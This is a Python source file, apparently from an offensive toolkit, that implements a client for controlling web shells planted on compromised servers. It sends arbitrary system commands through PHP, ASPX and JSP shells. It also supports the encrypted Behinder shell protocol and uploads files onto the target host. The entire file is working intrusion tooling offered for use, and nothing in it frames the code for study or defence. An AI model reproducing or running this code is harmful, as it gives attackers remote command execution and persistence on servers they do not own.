import requests
import aiiod.core.exceptions as exceptions
import random

from base64 import b64encode
from Crypto.Cipher import AES

_p = ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
_random_str = lambda: random.choice(_p) + random.choice(_p) + random.choice(
    _p) + random.choice(_p) + random.choice(_p) + random.choice(_p)


class AES128Encryptor(object):
    def __init__(self, key):
        self._key = self._padding_zero(key)

    def encrypt(self, msg) -> str:
        enc = AES.new(self._key, AES.MODE_CBC, b'\x00' * 16)
        return b64encode(enc.encrypt(self._padding_pkcs7(msg))).decode()

    def _padding_pkcs7(self, msg) -> bytes:
        if isinstance(msg, str):
            msg = msg.encode()

        if len(msg) == 0x10:
            return msg + b'\x10' * 0x10
        return msg + (
            0x10 - len(msg) % 0x10) * chr(0x10 - len(msg) % 0x10).encode()

    def _padding_zero(self, key) -> bytes:
        output = list(key)
        while len(output) % 16:
            output.append('\x00')

        return ''.join(output).encode()


class WebShellConnector(object):
    TIMEOUT = 5

    def __init__(self, url, pwd, lang='php', method='POST', is_behinder=False):
        self._url = url
        self._pwd = pwd
        self._lang = lang
        self._method = method
        self._is_behinder = is_behinder

        if is_behinder:
            self._behinder_key_exchange()

    def _behinder_key_exchange(self):
        self._session = requests.Session()
        r = self._session.get(
            self._url, params={self._pwd: '1'}, timeout=self.TIMEOUT)

        self._behinder_key = r.text[:16]
        self._aes_encryptor = AES128Encryptor(self._behinder_key)

        identify = _random_str()
        r = self._session.post(
            self._url,
            timeout=self.TIMEOUT,
            data=self._behinder_aes_encrypt(f'|print_r("{identify}");'))

        if identify in r.text:
            self._enc_way = 'aes'
        else:
            self._enc_way = 'xor'

    def _behinder_xor_encrypt(self, msg) -> str:
        output = []
        for i in range(0, len(msg)):
            output.append(
                chr(ord(msg[i]) ^ ord(self._behinder_key[((i + 1) & 15)])))

        return b64encode(''.join(output).encode()).decode()

    def _behinder_aes_encrypt(self, msg) -> str:
        return self._aes_encryptor.encrypt(msg)

    def _exec_php(self, cmd) -> str:
        if self._is_behinder:
            data = ('|@ini_set("display_errors","0");'
                    '@set_time_limit(0);'
                    f'system(\'{cmd}\');//')

            if self._enc_way == 'aes':
                data = self._behinder_aes_encrypt(data)
            elif self._enc_way == 'xor':
                data = self._behinder_xor_encrypt(data)
            else:
                raise exceptions.BehinderWebshellKeyExchangeException

        else:
            identify = _random_str()
            data = {
                self._pwd: ('@ini_set("display_errors","0");'
                            '@set_time_limit(0);'
                            f'print_r("=={identify}>");'
                            f'system(base64_decode($_REQUEST[_]));'
                            f'print_r("<{identify}==");'),
                '_':
                b64encode(cmd.encode()).decode(),
            }

        try:
            if self._is_behinder:
                r = self._session.post(
                    self._url, data=data, timeout=self.TIMEOUT)
                return r.content.decode(errors='ignore')

            else:
                if self._method == 'POST':
                    r = requests.post(
                        self._url, data=data, timeout=self.TIMEOUT)
                else:
                    r = requests.get(
                        self._url, params=data, timeout=self.TIMEOUT)
                content = r.content.decode(errors='ignore')
                output = content[content.find(f'=={identify}>') +
                                 9:content.find(f'<{identify}==')]
                return output

        except (requests.exceptions.RequestException,
                requests.exceptions.ConnectionError):
            raise exceptions.WebShellExecTimeoutException

    def _exec_aspx(self, cmd) -> str:
        try:
            identify = _random_str()
            data = {
                self._pwd: (f'Response.Write("=={identify}>");'
                            'var c=new System.Diagnostics.'
                            f'ProcessStartInfo("{cmd}");'
                            'var e=new System.Diagnostics.Process();'
                            'var out:System.IO.StreamReader;'
                            'var err:System.IO.StreamReader;'
                            'c.UseShellExecute=false;'
                            'c.RedirectStandardOutput=true;'
                            'c.RedirectStandardError=true;'
                            'e.StartInfo=c;'
                            'e.Start();'
                            'out=e.StandardOutput;'
                            'err=e.StandardError;'
                            'e.Close();'
                            'Response.Write(out.ReadToEnd()+'
                            'err.ReadToEnd());'
                            f'Response.Write("<{identify}==");'
                            'Response.End();')
            }

            if self._method == 'POST':
                r = requests.post(self._url, data=data, timeout=self.TIMEOUT)
            else:
                r = requests.get(self._url, params=data, timeout=self.TIMEOUT)

            content = r.content.decode(errors='ignore')
            output = content[content.find(f'=={identify}>') +
                             9:content.find(f'<{identify}==')]
            return output

        except (requests.exceptions.Timeout,
                requests.exceptions.ConnectionError):
            raise exceptions.WebShellExecTimeoutException

    def _exec_jsp(self, cmd) -> str:
        try:
            if self._method == 'POST':
                r = requests.post(
                    self._url, data={
                        self._pwd: cmd,
                    }, timeout=self.TIMEOUT)
            else:
                r = requests.get(
                    self._url, params={
                        self._pwd: cmd,
                    }, timeout=self.TIMEOUT)

            output = r.content.decode(errors='ignore')
            return output

        except (requests.exceptions.Timeout,
                requests.exceptions.ConnectionError):
            raise exceptions.WebShellExecTimeoutException

    def exec(self, cmd) -> str:
        cmd = cmd.replace('\\', '\\\\')
        fn = eval(f'self._exec_{self._lang}')
        return fn(cmd)

    def upload(self, src, dst):
        files = {
            'f': open(src),
        }
        code = ('@ini_set("display_errors","0");'
                '@set_time_limit(0);'
                f'move_uploaded_file($_FILES["f"]["tmp_name"], "{dst}");')
        try:
            if self._method == 'POST':
                files[self._pwd] = (None, code, None)
                r = requests.post(self._url, files=files, timeout=self.TIMEOUT)
            else:
                r = requests.post(
                    self._url,
                    params={
                        self._pwd: code,
                    },
                    files=files,
                    timeout=self.TIMEOUT)

            if r.status_code != 200:
                raise exceptions.WebShellUploadError
        except Exception:
            raise exceptions.WebShellUploadError
